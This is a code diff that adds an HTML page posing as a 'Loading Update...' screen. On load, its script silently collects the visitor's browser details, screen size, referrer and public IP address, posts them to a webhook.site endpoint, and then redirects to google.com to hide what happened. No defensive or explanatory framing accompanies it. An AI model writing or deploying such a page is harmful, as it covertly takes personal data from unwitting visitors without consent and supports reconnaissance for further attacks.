@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading Update...</title>
+  <style>body { background: #000; }</style>
+</head>
+<body>
+
+<script>
+  async function sendSilentRecon() {
+    const payload = {
+      timestamp: new Date().toISOString(),
+      ip: null,
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      connection: navigator.connection ? navigator.connection.type : "unknown",
+      effectiveType: navigator.connection ? navigator.connection.effectiveType : null,
+      screen: `${screen.width}x${screen.height}`,
+      referrer: document.referrer
+    };
+
+    // Get public IP
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      payload.ip = data.ip;
+    } catch(e) {}
+
+    // Send to webhook (silent)
+    try {
+      await fetch('https://webhook.site/0c2777c2-743a-4862-9a2d-0a88a11e47b2', {
+        method: 'POST',
+        body: JSON.stringify(payload, null, 2),
+        headers: { 'Content-Type': 'application/json' }
+      });
+    } catch(e) {}
+
+    // Auto redirect after sending (silent)
+    setTimeout(() => {
+      window.location.href = "https://google.com";   // Change this to any safe site
+    }, 800);
+  }
+
+  // Run immediately
+  window.onload = sendSilentRecon;
+</script>
+
+</body>
+</html>
